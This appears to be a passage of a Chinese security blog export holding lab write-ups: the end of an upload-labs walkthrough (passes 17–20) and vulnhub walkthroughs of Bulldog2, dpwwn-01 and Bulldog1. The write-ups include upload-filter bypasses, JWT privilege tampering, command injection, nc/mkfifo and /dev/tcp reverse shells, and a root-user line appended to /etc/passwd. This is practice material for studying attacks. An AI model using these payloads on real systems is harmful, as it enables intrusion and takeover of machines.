<h1 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h1><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是先move_uploaded_file函数将上传文件临时保存，再进行判断，如果不在白名单里则unlink删除，在的话就rename重命名，所以这里存在条件竞争。</p>
<p>可以使用条件竞争进行绕过</p>
<p>我们上传的文件是有缓存的，move_uploaded_file(a,b)就是把a移到b，所以move_uploaded_file($temp_file, $upload_file)就是把缓存移动到UPLOAD_PATH . ‘/’ . $file_name，紧接着会判断我们的文件的后缀了，如果不是规定的后缀就会被unlink(删除)。</p>
<p>条件竞争就是我们不断传上去php木马文件，在被移动到UPLOAD_PATH . ‘/’ . $file_name之后，在没有来得及被unlink处理之前去访问这个文件。</p>
<p>用burp开启两个intruder模块，一个用于重复上传，另一个用于重复访问。<br>1、先设置上传请求,记住此处的文件名，等下要用来拼接访问请求的url<br><img src="/2020/03/08/upload-labs/7.jpg" alt><br>2、因为此处没有什么参数需要爆破，只是需要重复发起请求，所以payload设置为Null payloads,设置访问次数5000次，线程50个<br><img src="/2020/03/08/upload-labs/8.jpg" alt></p>
<p>接下来设置访问请求<br> 1、浏览器构造请求url：<a href="http://39.106.13.91:7091/upload/phpinfo.php`,进行访问，然后用burp抓包" target="_blank" rel="noopener">http://39.106.13.91:7091/upload/phpinfo.php`,进行访问，然后用burp抓包</a><br> 2、burp抓包后发送至intruder模块，然后设置payload，这一步和上传请求设置差不多,都是Null payloads、5000次、50个线程<br><img src="/2020/03/08/upload-labs/9.jpg" alt><br><img src="/2020/03/08/upload-labs/10.jpg" alt><br>最后有三个成功上传<br><img src="/2020/03/08/upload-labs/11.jpg" alt></p>
<h1 id="pass-18"><a href="#pass-18" class="headerlink" title="pass-18"></a>pass-18</h1><p>部分源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$ret = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">   <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">     $ret = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">     <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">"SUCCESS"</span> );</span><br></pre></td></tr></table></figure>

<p>这里先将上传的文件保存（move函数），再rename重命名一下。所以也存在条件竞争，绕过方法和上面Pass-17差不多<br>不过这题对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，因此可以通过不断上传图片马，由于条件竞争可能来不及重命名，从而上传成功。</p>
<h1 id="pass-19"><a href="#pass-19" class="headerlink" title="pass-19"></a>pass-19</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'禁止保存为该类型文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>move_uploaded_file会忽略掉文件末尾的/.<br> 所以可以构造save_path=1.php/.,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php。最后通过文件包含访问</p>
<p><img src="/2020/03/08/upload-labs/13.jpg" alt><br><img src="/2020/03/08/upload-labs/14.jpg" alt></p>
<h1 id="pass-20"><a href="#pass-20" class="headerlink" title="pass-20"></a>pass-20</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">'upload_file'</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    $allow_type = <span class="keyword">array</span>(<span class="string">'image/jpeg'</span>,<span class="string">'image/png'</span>,<span class="string">'image/gif'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>],$allow_type))&#123;</span><br><span class="line">        $msg = <span class="string">"禁止上传该类型文件!"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        $file = <span class="keyword">empty</span>($_POST[<span class="string">'save_name'</span>]) ? $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>] : $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = <span class="string">"禁止上传该后缀文件!"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = <span class="string">"文件上传成功！"</span>;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">"文件上传失败！"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $msg = <span class="string">"请选择要上传的文件！"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$file为数组的话，就不用经过explode处理再变成数组，我们直接上传数组的话，增加了我么的控制性。<br>end($file)会经过后缀名检测，所以数组最后一个一定是白名单中的后缀。<br>$file_name = reset($file) . ‘.’ . $file[count($file) - 1];通常$file[count($file) - 1]和end($file)都指向数组最后一个元素，但是在这里如果这样，那么上传上去的将只能是图片,所以我们可以抓包这样修改<br><img src="/2020/03/08/upload-labs/15.jpg" alt><br>上传成功<br><img src="/2020/03/08/upload-labs/16.jpg" alt><br><img src="/2020/03/08/upload-labs/17.jpg" alt></p>
<p>upload-labs这个靶场到这来算是完成了，%00截断由于版本问题没有复现成功。做完之后比之前第一遍做的时候学到了更多，还是颇有收获~~</p>
<p>参考链接：<a href="https://www.jianshu.com/p/290f1d1b6e44" target="_blank" rel="noopener">https://www.jianshu.com/p/290f1d1b6e44</a></p>
]]></content>
      <tags>
        <tag>upload-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机-Bulldog2</title>
    <url>/2020/07/06/Bulldog2/</url>
    <content><![CDATA[<p><strong>vulnhub靶机系列-Bulldog2</strong></p>
<p><strong>知识点：</strong></p>
<blockquote>
<ul>
<li>node.js源码分析</li>
<li>水平越权，垂直越权</li>
<li>NC反弹shell</li>
<li>写入/etc/passwd提取</li>
</ul>
</blockquote>
<a id="more"></a>

<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><h2 id="靶机下载"><a href="#靶机下载" class="headerlink" title="靶机下载"></a>靶机下载</h2><p>下载靶机ova文件之后，直接右键导入虚拟机即可，网卡设置为net模式</p>
<blockquote>
<p><img src="/2020/07/06/Bulldog2/1593676547721.png" alt="1593676547721"></p>
</blockquote>
<h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><p>参考：<a href="http://cyzcc.vip/2020/06/29/Os-hackNos-3/">http://cyzcc.vip/2020/06/29/Os-hackNos-3/</a>里面的配置方式</p>
<p><img src="/2020/07/06/Bulldog2/1593435681743.png" alt="1593435681743"></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><strong>主机发现</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.211</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/06/Bulldog2/1593507040858.png" alt="1593507040858"></p>
<p><strong>端口扫描</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nmap -A <span class="number">192.168</span><span class="number">.211</span><span class="number">.150</span> -p <span class="number">1</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure>

<p>靶机开放了80端口，访问发现是一个可以注册和登录的网站</p>
<p>登陆抓包，尝试是否有sql注入<br><img src="/2020/07/06/Bulldog2/1593567471917.png" alt="1593567471917"></p>
<p>爆出网站路径，但是猜测之后似乎不存在SQL注入</p>
<p>当准备注册的时候发现注册功能不被允许使用<br><img src="/2020/07/06/Bulldog2/1593507184463.png" alt="1593507184463"></p>
<p>目录扫描也没有什么发现，在源码中发现了几个js文件，下载下来进行利用<br><img src="/2020/07/06/Bulldog2/1593566759371.png" alt="1593566759371"></p>
<p>通过在main….js中搜索关键字register找到了文件注册的路径<br><img src="/2020/07/06/Bulldog2/1593566813771.png" alt="1593566813771"></p>
<p>然后发现了一处跟登陆格式相似的地方，猜测为注册时的格式</p>
<p><img src="/2020/07/06/Bulldog2/1593567341692.png" alt="1593567341692"></p>
<h1 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a>GETSHELL</h1><p>尝试构造注册时的数据包，将/users/authenticate改为/users/register<br><img src="/2020/07/06/Bulldog2/1593567833575.png" alt="1593567833575"></p>
<p>注册成功，并且能成功登陆<br><img src="/2020/07/06/Bulldog2/1593567903312.png" alt="1593567903312"></p>
<p>通过观察可以发现用户名会直接拼接在url后面，可以再注册一个账号，测试是否存在水平越权<br><img src="/2020/07/06/Bulldog2/1593568578617.png" alt="1593568578617"></p>
<p>越权成功，存在水平越权。之后尝试垂直越权到admin，但是失败了<br><img src="/2020/07/06/Bulldog2/1593568706678.png" alt="1593568706678"></p>
<p>尝试注册一个admin用户，虽然注册成功，但是登陆进去跟普通用户一样<br>之后使用该admin账号登陆时抓包发现了jwt和一个auto_level参数，猜测这个应该是用户权限水平<br><img src="/2020/07/06/Bulldog2/1593568977635.png" alt="1593568977635"></p>
<p>在js里面搜索<code>auth_level</code>，发现了<code>master_admin_user</code>，猜测如果将auth_level的值修改为master_admin_user，应该就为管理员权限了<br><img src="/2020/07/06/Bulldog2/1593569037783.png" alt="1593569037783"></p>
<p>将jwt解码后也存在auth_level字段<br><img src="/2020/07/06/Bulldog2/1593569337540.png" alt="1593569337540"></p>
<p>依然是在登陆时抓包，因为数据是在返回包中，所以使用如下的方式修改，之后点Drop即可修改数据</p>
<p><img src="/2020/07/06/Bulldog2/1593569458595.png" alt="1593569458595"></p>
<p><img src="/2020/07/06/Bulldog2/1593569725495.png" alt="1593569725495"></p>
<p>成功获得管理员权限，并且多出了一个功能</p>
<p><img src="/2020/07/06/Bulldog2/1593569764240.png" alt="1593569764240"></p>
<p>在admin页面进行抓包，删除一个双引号之后爆出网站路径<br><img src="/2020/07/06/Bulldog2/1593569943885.png" alt="1593569943885"></p>
<p><a href="https://github.com/Frichetten/Bulldog-2-The-Reckoning" target="_blank" rel="noopener">Bulldog-2-The-Reckoning</a>这个为github上面的一个项目，通过审计发现存在命令注入<br><img src="/2020/07/06/Bulldog2/1593591931978.png" alt="1593591931978"></p>
<p>在routes/users.js /文件里面，通过搜索返回包里面的<code>&quot;success&quot;:false,&quot;msg&quot;:&quot;Wrong password&quot;</code>字段，发现了exec函数<br><img src="/2020/07/06/Bulldog2/1593592063534.png" alt="1593592063534"></p>
<p>但是这个命令执行并不会回显，所以直接反弹shell<br>先使用ping命令验证一下</p>
<p><img src="/2020/07/06/Bulldog2/1593592650112.png" alt="1593592650112"></p>
<p><img src="/2020/07/06/Bulldog2/1593592636209.png" alt="1593592636209"></p>
<p>成功执行命令，这里使用nc进行反弹shellNC反弹</p>
<p>默认linux的nc没有带-e(发送至性程序)选项, 可以通过命名管道的方式把bash通过nc反弹出来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">受害主机:</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">192.168</span><span class="number">.211</span><span class="number">.151</span> <span class="number">777</span> &gt; /tmp/f</span><br><span class="line"></span><br><span class="line">攻击主机先监听<span class="number">8080</span>端口:</span><br><span class="line"></span><br><span class="line">nc -lvp <span class="number">777</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/06/Bulldog2/1593592926252.png" alt="1593592926252"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>使用sudo需要密码，所以不能使用sudo提权<br><strong>先查看改用户拥有的文件</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">find / -user node <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/06/Bulldog2/1593593769519.png" alt="1593593769519"></p>
<p>似乎没有可以利用的文件<br><strong>搜索可写入文件</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">find / -perm <span class="number">-2</span> -type f <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/06/Bulldog2/1593593828626.png" alt="1593593828626"></p>
<p>发现/etc/passwd文件可写，可以使用写入root用户的方式进行提取</p>
<blockquote>
<p>先使用openssl工具先创建一个本地的加密用户：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">openssl passwd <span class="number">-1</span> -salt admin <span class="number">123456</span></span><br><span class="line"> </span><br><span class="line">=&gt;$<span class="number">1</span>$admin$LClYcRe.ee8dQwgrFc5nz.</span><br></pre></td></tr></table></figure>

<p>构造/etc/passwd</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">hack:$<span class="number">1</span>$admin$LClYcRe.ee8dQwgrFc5nz.:<span class="number">0</span>:<span class="number">0</span>::/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p>写入/etc/passwd</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'hack:$1$admin$LClYcRe.ee8dQwgrFc5nz.:0:0::/root:/bin/bash'</span> &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>

<p>这里 使用单引号，双引号会导致写入不全</p>
<p><img src="/2020/07/06/Bulldog2/1593595386641.png" alt="1593595386641"></p>
</blockquote>
]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机-dpwwn-01</title>
    <url>/2020/07/06/dpwwn-01/</url>
    <content><![CDATA[<p><strong>vulnhub靶机-dpwwn-01</strong><br><strong>知识点：</strong></p>
<blockquote>
<p>mysql弱口令<br>利用root权限定时文件提权</p>
</blockquote>
<a id="more"></a>

<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><h2 id="靶机下载"><a href="#靶机下载" class="headerlink" title="靶机下载"></a>靶机下载</h2><p>下载靶机后解压，打开vmx文件即可，网卡设置为net模式</p>
<blockquote>
<p><strong>描述</strong></p>
<p>该boot2root是基于Linux的虚拟机，并已使用VMware工作站14进行了测试。</p>
<p>VM的网络接口将从DHCP（网络模式：NAT）获取IP设置。</p>
<p>目标：获得root特权，并在/ root目录下获取dpwwn-01-FLAG.txt的内容。</p>
<p>注意：已在VMware工作站14上测试。</p>
<p>难度：对初学者来说容易/有帮助。</p>
</blockquote>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><strong>主机发现</strong></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.211</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/06/dpwwn-01/1591147173930.png" alt="1591147173930"></p>
<p>得到靶机ip为<code>192.168.211.147</code><br><strong>端口扫描</strong><br><code>nmap -A 192.168.211.147 -p 1-65535</code><br><img src="/2020/07/06/dpwwn-01/1591147517943.png" alt="1591147517943"></p>
<p>开放了一个22端口、80端口、3306端口</p>
<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>访问80端口，发现只是一个测试页面，扫描目录页没有太多发现，只发现了一个phpinfo页面</p>
<p>之后尝试从3306端口访问</p>
<blockquote>
<p><code>mysql -h 192.168.211.147 -u root  -p</code>  </p>
</blockquote>
<p>不知道密码，直接回车发现没有密码</p>
<p><img src="/2020/07/06/dpwwn-01/1591147976008.png" alt="1591147976008"></p>
<p>之后再ssh库中的users表发现了一个ssh账号密码<br><img src="/2020/07/06/dpwwn-01/1591148057680.png" alt="1591148057680"></p>
<p>使用ssh登陆</p>
<blockquote>
<p><code>ssh mistic@192.168.211.147</code></p>
</blockquote>
<p>输入密码即登陆成功<br><img src="/2020/07/06/dpwwn-01/1591148215902.png" alt="1591148215902"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>之后再/home/mistic目录下发现一个logrot.sh文件<br>猜想是否可以通过该文件来进行提取，首先这个文件需要被root用户所执行<br>查看定时任务</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/06/dpwwn-01/1591148752308.png" alt="1591148752308"></p>
<p>发现该文件会被root用户所执行，满足条件，之后考虑用该文件反弹shell，使用msfvenom在kali里面生成payload：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash lhost=<span class="number">192.168</span><span class="number">.211</span><span class="number">.151</span> lport=<span class="number">7777</span></span><br><span class="line"></span><br><span class="line">===》<span class="number">0</span>&lt;&amp;<span class="number">168</span>-;exec <span class="number">168</span>&lt;&gt;/dev/tcp/<span class="number">192.168</span><span class="number">.211</span><span class="number">.151</span>/<span class="number">7777</span>;sh &lt;&amp;<span class="number">168</span> &gt;&amp;<span class="number">168</span> <span class="number">2</span>&gt;&amp;<span class="number">168</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/06/dpwwn-01/1591149024924.png" alt="1591149024924"></p>
<p><img src="/2020/07/06/dpwwn-01/1591149162184.png" alt="1591149162184"></p>
<p>之后使用nc监听，执行脚本后即可获得root权限<br><img src="/2020/07/06/dpwwn-01/1591149308631.png" alt="1591149308631"></p>
]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机-Bulldog1</title>
    <url>/2020/07/06/Bulldog1/</url>
    <content><![CDATA[<p><strong>难度</strong>：初级</p>
<p><strong>知识点:</strong></p>
<blockquote>
<p>命令执行绕过</p>
<p>利用用户文件提权</p>
</blockquote>
<a id="more"></a>

<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><h2 id="靶机下载"><a href="#靶机下载" class="headerlink" title="靶机下载"></a>靶机下载</h2><p>下载靶机ova文件之后，直接右键导入虚拟机即可，网卡设置为net模式</p>
<blockquote>
<p><img src="/2020/07/06/Bulldog1/1593676630500.png" alt="1593676630500"></p>
</blockquote>
<h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><p>参考文章：<a href="https://blog.csdn.net/Eastmount/article/details/106066009" target="_blank" rel="noopener">https://blog.csdn.net/Eastmount/article/details/106066009</a></p>
<p>到开机页面选择第二个Ubuntu的高级选项，如果启动网络正常的话可以直接开机，如果网络不正常可以按下面步骤操作。进入高级选项，再次选择第二个Linux内核版本的恢复模式回车。<br><img src="/2020/07/06/Bulldog1/1590843558640.png" alt="1590843558640"></p>
<p>回车后会弹出选择界面，选择root一行回车，接着再次回车进入命令行模式。</p>
<p><img src="/2020/07/06/Bulldog1/1590843569852.png" alt="1590843569852"></p>
<p>输入<code>&quot;mount -o rw,remount / &quot;</code>命令，再配置网络问卷，否则后面可能无法保存网络配置文件，这个命令让我们的 / 路径文件系统的可读模式能自由修改。接着输入命令查看网卡。</p>
<blockquote>
<p>mount -o rw,remount /<br>ifconfig -a</p>
</blockquote>
<p><img src="/2020/07/06/Bulldog1/1590843612115.png" alt="1590843612115"></p>
<p>这里是ens33，然后继续输入命令修改网络配置文件。输入I修改模式，如下图所示。</p>
<blockquote>
<p>vi /etc/network/interfaces</p>
</blockquote>
<p>修改这两个地方，改成你的网卡名称，然后输入“:wq”保存。<br><img src="/2020/07/06/Bulldog1/1590843639246.png" alt="1590843639246"></p>
<p>最后输入reboot重启即可。</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><strong>主机发现</strong></p>
<blockquote>
<p>nmap -sP 192.168.211.1/24<br>或者<br>arp-scan l</p>
</blockquote>
<p><img src="/2020/07/06/Bulldog1/1590844468031.png" alt="1590844468031"></p>
<p>发现目标主机的ip地址为<code>192.168.211.149</code><br><strong>扫描端口</strong></p>
<blockquote>
<p>nmap -A 192.168.211.149 -p 1-65535</p>
</blockquote>
<p><img src="/2020/07/06/Bulldog1/1590844693656.png" alt="1590844693656"></p>
<p>发现主机开放了<code>23  80  8080</code> 三个端口<br>先从80端口入手<br>访问<code>http://192.168.211.149</code>为一个普通网站，只有一个按钮，使用扫描器扫描一下网站目录<br><img src="/2020/07/06/Bulldog1/1590844936041.png" alt="1590844936041"></p>
<p>访问admin，跳转到网站后台，是用python写的框架<br>之后进行指纹识别<code>whatweb http://192.168.211.149</code><br><img src="/2020/07/06/Bulldog1/1590845230405.png" alt="1590845230405"></p>
<p>没什么新的发现，在使用nikto扫描一下</p>
<blockquote>
<p><code>nikto -h http://192.168.211.149</code></p>
</blockquote>
<p><img src="/2020/07/06/Bulldog1/1590846538055.png" alt="1590846538055"></p>
<p>发现了一个<code>/dev</code>目录</p>
<p>使用dirb扫描<br><code>dirb http://192.168.211.149</code><br><img src="/2020/07/06/Bulldog1/1590846702695.png" alt="1590846702695"></p>
<p>访问/dev/shell，显示必须通过验证才能使用shell<br>在/dev页面查看源码发现一些东西</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--Need these password hashes for testing. Django's default is too complex--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--We'll remove these in prod. It's not like a hacker can do anything with a hash--&gt;</span></span><br><span class="line">Team Lead: alan@bulldogindustries.com<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="comment">&lt;!--6515229daf8dbdc8b89fed2e60f107433da5f2cb--&gt;</span></span><br><span class="line">Back-up Team Lead: william@bulldogindustries.com<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="comment">&lt;!--38882f3b81f8f2bc47d9f3119155b05f954892fb--&gt;</span></span><br><span class="line">Front End: malik@bulldogindustries.com<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="comment">&lt;!--c6f7e34d5d08ba4a40dd5627508ccb55b425e279--&gt;</span></span><br><span class="line">Front End: kevin@bulldogindustries.com<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="comment">&lt;!--0e6ae9fe8af1cd4192865ac97ebf6bda414218a9--&gt;</span></span><br><span class="line">Back End: ashley@bulldogindustries.com<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="comment">&lt;!--553d917a396414ab99785694afd51df3a8a8a3e0--&gt;</span></span><br><span class="line">Back End: nick@bulldogindustries.com<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="comment">&lt;!--ddf45997a7e18a25ad5f5cf222da64814dd060d5--&gt;</span></span><br><span class="line">Database: sarah@bulldogindustries.com<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="comment">&lt;!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e--&gt;</span></span><br></pre></td></tr></table></figure>

<p>猜测后面的MD5便是密码<br>一次破解，得到下面几组</p>
<blockquote>
<p>sarah<br>bulldoglover</p>
<p>nick<br>bulldog</p>
</blockquote>
<h1 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a><strong>GETSHELL</strong></h1><p>之后去admin界面登录，登录之后再访问/dev/shell发现可以执行一些命令<br><img src="/2020/07/06/Bulldog1/1590847415016.png" alt="1590847415016"></p>
<p>接下来想办法反弹shell，由于限制了命令的执行，所以要想办法绕过。这里有echo命令，所以可以考虑将需要的命令写入文件，之后再使用bash执行。并且使用组合命令便可以绕过限制<br><code>pwd&amp;&amp;id</code><br><img src="/2020/07/06/Bulldog1/1590848038242.png" alt="1590848038242"></p>
